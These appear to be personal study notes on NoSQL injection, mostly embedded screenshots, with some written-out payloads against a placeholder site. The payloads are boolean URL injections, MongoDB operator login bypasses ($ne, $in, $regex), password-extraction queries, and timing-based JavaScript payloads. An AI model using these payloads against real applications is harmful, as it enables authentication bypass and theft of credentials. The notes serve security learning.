
![[Pasted image 20250214211230.png]]
![[Pasted image 20250214211320.png]]

![[Pasted image 20250214211655.png]]
![[Pasted image 20250214211707.png]]
![[Pasted image 20250214211909.png]]
![[Pasted image 20250214212012.png]]
```URL
False
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
True
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```

![[Pasted image 20250214212230.png]]
```code
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
```
![[Pasted image 20250214214946.png]]
![[Pasted image 20250214215037.png]]

![[Pasted image 20250215204414.png]]
![[Pasted image 20250215204603.png]]
![[Pasted image 20250215204958.png]]
![[Pasted image 20250215205118.png]]
```code
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}

{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}

{"username":{"$regex":"invalid"},"password":{"$ne":""}}
```


![[Pasted image 20250215214241.png]]

![[Pasted image 20250215215015.png]]
![[Pasted image 20250215215234.png]]

![[Pasted image 20250215215453.png]]
```code
	https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
```

![[Pasted image 20250215215520.png]]
![[Pasted image 20250215215550.png]]


![[Pasted image 20250218190507.png]]
![[Pasted image 20250218190623.png]]
![[Pasted image 20250218190846.png]]


![[Pasted image 20250224200016.png]]
![[Pasted image 20250224200528.png]]
```code

admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}
(this)+'

admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'

```